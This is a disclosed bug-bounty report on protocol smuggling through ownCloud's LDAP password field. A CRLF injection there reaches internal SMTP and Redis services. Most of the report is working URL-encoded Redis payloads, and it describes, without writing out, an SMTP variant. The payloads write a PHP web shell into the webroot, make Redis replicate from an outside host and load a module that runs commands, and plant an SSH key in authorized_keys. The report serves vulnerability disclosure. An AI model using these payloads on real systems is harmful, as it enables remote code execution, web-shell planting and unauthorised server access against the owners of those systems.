# Protocol Smuggling over LDAP password field

## Report Details
- **Report ID**: 1054282
- **URL**: https://hackerone.com/reports/1054282
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-12-08T17:59:01.861Z
- **Disclosed**: 2021-09-03T13:20:13.732Z

## Reporter
- **Username**: pabl00nicarres
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
Privileges required: Admin

Hi,
"user_ldap" plugin can be leveraged to interact with internal services over various protocols.
LDAP password field can be exploited with newline chars (\r\n) in order to communicate with protocols like SMTP, Redis and, generally speaking, with all services those speak plain text protocols (e.g. postgres, memcached, etc.). 
I concentrated only on SMTP and Redis services.  
The following code is responsible for setting password field, without checking the user input for new lines chars.
{F1109105}
For all other ldap settings, the below check is performed.
{F1109090}
{F1109091}
An attacker, able to steal admin credentials/session cookies could leverage the password field to send arbitrary e-mails and even achieve remote code execution.
Below some examples and payloads used.
When setting LDAP password is mandatory to intercept the request with a web proxy to get rid of URL encoding performed by Owncloud.
For SMTPs services the process is trivial and exploitable with or without authentication (when credentials are known). Is sufficient to give arbitratry SMTP commands separated by EOL CHARS "%0D%0A".
{F1109106}

For redis instances, the issue can be exploited in many different ways, even with authentication set (when credentials are known). 
I included a POC for 3 principal cases:
- Writing a web shell into Owncloud webroot (according to redis user’s permissions).
 Below payload and evidences:
`_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2434%0D%0A/home/bitnami/apps/owncloud/htdocs%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A`
{F1109110}
{F1109143}

- Master / Slave replication exploit (this generally works on all redis versions from 4.x to 5.x) and permits arbitrary command execution (In the example I just wrote a file in tmp but it also can be a reverse shell).
`%0D%0ASLAVEOF%20192.168.1.237%206666%0D%0Aconfig%20set%20dbfilename%20exp.so%0D%0A0D%0Aquit%0D%0A`
`%0D%0A%0D%0AMODULE%20LOAD%20./exp.so%0D%0Asystem.exec%20touch%20/tmp/redis_master_slave%0D%0A`
{F1109121}

- Writing a ssh key in Redis home and then connecting to server, as explained by Antirez here: http://antirez.com/news/96. 
`_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%24667%0D%0A%0A%0Assh-rsa%0A%0A----BEGIN%20RSA%20PRIVATE%20KEY%0A%0AMIIBuwIBAAKBgQCM9adaXNfWm%2BtxyY7z3R0lV9TULSd5Z/6sHIw1sDqXkX2T9LLDgF75IbaTKeToMV4uq/eqBhMOcpW3XZytTJ6LKxmzMhGq9fIK%2BNmhnbTvcZ6CJSuJefcnQrzMdlF/gsjzrESc5H/RB64Gtty4b3QchWl77BM2zQKzboxHvLlMKwIVAJ/1fDsXaW5766Lmrv551XI/uIY9AoGAeFXLCK8Upuu3tsKffDtjjsomVxCCEghPL%2BLmHjJc6MVl4ZW4t%2BggzFJ5mPlQiBDh5ykWj5dVlsMtqR7LoMUsQGSjWicYeMKer3zn0ijoFUHuNXX3QJLJd3lWJrlKGs1ABizXsl4SH/%2BGwWYVWN%2BM3lYj9lFyONu66Ei857PX%2BwgCgYBl9eW36ZaBDGHBDH6wL8BwwPS1IhNPgRvecgP648/8vEs5C9buSxsjX40Yw/It%2BhB/nDjyjGYleWB8AaTguKhi9Te9tKdxwod5qg/T/uXH9IXoF9QnkLNUvnWe4KlcUW/0m2JpY5w0W5utmsC2gwLzXN7Zxnon3%2BRblzg9MIj6EwIVAIq6g7pVO/xwR5/ZNRZfRk5TfIjS%0A%0A-----END%20DSA%20PRIVATE%20KEY-----%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2420%0D%0A/var/lib/redis/.ssh/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%2A1%0D%0A%244%0D%0Aquit%0D%0A`
{F1109133}
I set the severity to low because of preconditions required: Administrator access and presence of these services, listening on localhost or  internal network.

## Impact

As always for SSRF related issues, impact may vary depending on exposed services.

## Attachments
- setmultiline_function.png
- setmultiline.png
- setrawvalue.png
- smtp_poc.png
- redis_master_slave.png
- command_output.png
- redis_write_ssh.png
- command_output.png
